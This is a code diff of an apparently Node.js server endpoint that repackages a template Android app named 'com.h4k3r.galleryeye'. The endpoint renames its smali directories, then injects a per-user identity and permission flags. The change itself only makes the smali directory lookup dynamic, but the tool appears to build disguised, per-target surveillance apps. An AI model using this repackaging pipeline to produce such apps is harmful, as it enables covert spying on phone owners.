@@ -160,9 +160,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             }
 
             // Rename smali directories
-            const smaliDir = path.join(workDir, 'smali', 'com', 'h4k3r', 'galleryeye');
-            const smaliClassesDir = path.join(workDir, 'smali_classes3', 'com', 'h4k3r', 'galleryeye');
-
             const updateSmaliFiles = (dir) => {
                 if (!fs.existsSync(dir)) return;
                 const files = fs.readdirSync(dir, { withFileTypes: true });
@@ -178,10 +175,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     }
                 }
             };
-
-            updateSmaliFiles(path.join(workDir, 'smali'));
-            updateSmaliFiles(path.join(workDir, 'smali_classes2'));
-            updateSmaliFiles(path.join(workDir, 'smali_classes3'));
 
             // 2.7. Physically rename smali directories to match new package name
             // Without this, Android can't find classes at runtime (directory path = class path)
@@ -222,9 +215,18 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 console.log(`[APK] Smali dir renamed: ${oldSmaliPath} -> ${newSmaliPath}`);
             };
 
-            renameSmaliFolders(path.join(workDir, 'smali'));
-            renameSmaliFolders(path.join(workDir, 'smali_classes2'));
-            renameSmaliFolders(path.join(workDir, 'smali_classes3'));
+            // Dynamically find all smali directories
+            const workDirItems = fs.readdirSync(workDir, { withFileTypes: true });
+            const smaliDirs = workDirItems
+                .filter(item => item.isDirectory() && (item.name === 'smali' || item.name.startsWith('smali_classes')))
+                .map(item => item.name);
+
+            console.log(`[APK] Found smali directories: ${smaliDirs.join(', ')}`);
+
+            for (const sDir of smaliDirs) {
+                updateSmaliFiles(path.join(workDir, sDir));
+                renameSmaliFolders(path.join(workDir, sDir));
+            }
 
             // 3. Inject Config with permission flags
             await sendUpdate('apk_progress', { step: 'Injecting unique user identity...', progress: 45 });
